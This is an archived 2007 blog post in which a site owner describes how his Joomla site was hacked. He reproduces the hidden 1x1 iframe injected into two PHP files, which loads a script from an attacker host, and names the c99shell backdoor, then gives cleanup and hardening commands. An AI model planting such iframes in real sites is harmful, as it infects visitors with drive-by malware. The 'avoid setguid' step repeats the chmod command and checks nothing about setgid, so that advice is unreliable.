---
id: 2991
title: 'Got hacked&#8230;'
date: '2007-06-20T19:54:26+02:00'
author: 'Cédric Walter'

guid: 'https://waltercedric.com/new/?p=2991'
permalink: /security/got-hacked/
tags:
    - security
---

 Everything has started with an email

| Trojan-Downloader.VBS.Agent‎    From: Enrique MONTECRISTO (xxxxx@xxxxxx.com)    Sent: Mon 6/18/07 10:04 PM    To: cedricwalter@xxxxxxx.com        Hello Cedric,    When I browse your website with Firefox, I get this kind of warning from my GDATA antivirus shield :    http://www.gdata.de/trade/GB/productview/727/16    —————————    Virus: Trojan-Downloader.VBS.Agent.u    Adress: stat1count.net    —————————-    Virus: Trojan-Downloader.JS.Agent.fq    Address: stat1count.net    —————————-    Is it a fake ?</small> |
|---|

 The "virus<small>" Trojan-Downloader.JS.</small> seems like a malicious javascript inline somewhere in my homepage  
 Thanks to Firefox WebDeveloper toolbar, it was quite easy to locate the malicious script (View all javascript)

 The Hacker was inserting 2 strange line in my content. He has tampered:

 <span style="font-weight: bold;">`

`  <span style="font-weight: bold;">index.php  
 <big>`<small>// displays queries performed for page

 if ($mosConfig_debug) {

  echo $database->_ticker . ' queries executed';

  echo '<pre>';

  foreach ($database->_log as $k=>$sql) {

  echo $k+1 . "\n" . $sql . '<hr />';

  }

  echo '</pre>';

 }

 doGzip();

 ?></small>`</big>  
 **<span style="color: rgb(255, 0, 0);"><iframe width=’1′ height=’1′ border=’0′ frameborder=’0′ src=’http://xxxx.info/stds/go.php?sid=3′></iframe>**

 AND <span style="font-weight: bold;">/index2.php

 ` <html xmlns="http://www.w3.org/1999/xhtml">

  <head>

  <?php echo $mainframe->getHead(); ?>

  <link rel="stylesheet" href="templates/<?php echo $cur_template;?>/css/template_css.css" type="text/css" />

  <link rel="shortcut icon" href="<?php echo $mosConfig_live_site; ?>/images/favicon.ico" />

  <meta http-equiv="Content-Type" content="text/html; <?php echo _ISO; ?>" />

  <meta name="robots" content="noindex, nofollow" />

  <?php if ($my->id || $mainframe->get( 'joomlaJavascript' )) { ?>

  <script language="JavaScript" src="<?php echo $mosConfig_live_site;?>/includes/js/joomla.javascript.js" type="text/javascript"></script>

  <?php } ?>

  </head>

  <body class="contentpane">

 <span style="background-color: rgb(255, 255, 153);"> <span style="color: rgb(255, 0, 0);"><iframe width='1' height='1' border='0' frameborder='0' src='http://xxxxx.info/stds/go.php?sid=3'></iframe>

  <?php mosMainBody(); ?>

  </body>

  </html>

  <?php`<big>  
 </big>  
 Which got replace at runtime with  
 http://xxx.info/stds/pages/default.php[  ](http://ygsondheks.info/c/2380/counter21.php)http://xxxxxxx.info/c/2380/counter21.php

 `<span style="background-color: rgb(255, 255, 153);">xxxxx.info` I dont want to make publicity to this hacker by publishing his server url here

 <span style="font-weight: bold;">How to find all place potentialy infected?

 return a list of all files with path (-H) that contains the substring `xxxxx`

 `# find . -type f -exec grep -H xxxxx {} \;`

 <span style="font-weight: bold;">How did I get infected?

 It seems that the hacker has use my demo site at [demo.waltercedric.com](http://demo.waltercedric.com/) to copy an image on the server or replace an existing one which was having bad user rights  
 It may be an image like this one runme.php.jpg this image then bootstrap and load a hacker tool c99shell (also known as PHP/C99Shell.A or Backdoor.PHP.C99Shell.c)

 PHP/C99Shell-A is a backdoor Trojan for platforms with PHP support, such as web servers. PHP/C99Shell-A listens for commands from a remote user.

 <span style="font-weight: bold;">How to avoid that next time

 <span style="font-weight: bold; background-color: rgb(255, 255, 255); color: rgb(255, 0, 0);">No file in apache root must have more than r–r–r– rights so here is a small scripts that you can crontab or save for periodically check. It automatically change all files to <span style="font-weight: bold;">read only for all, group and other   
 `

 # find . -type f -perm 600 -exec chmod ago=r {} \;`

 Joomla! is automating during file save the CHMOD, but not on all files in the structure.

 <span style="color: rgb(255, 0, 0); font-weight: bold;"> Avoid any files with setguid in your apache root  
 `# find . -type f -perm 600 -exec chmod ago=r {} \;`

 Note:

- `Both demo Joomla 1.0.12 `[demo.waltercedric.com](http://demo.waltercedric.com/) `and ``oomla 1.5 beta `[demo2.waltercedric.com](http://demo.waltercedric.com/) `are down since I remove all files to remove hacker trojan`

`

 `

 ``

</body></html>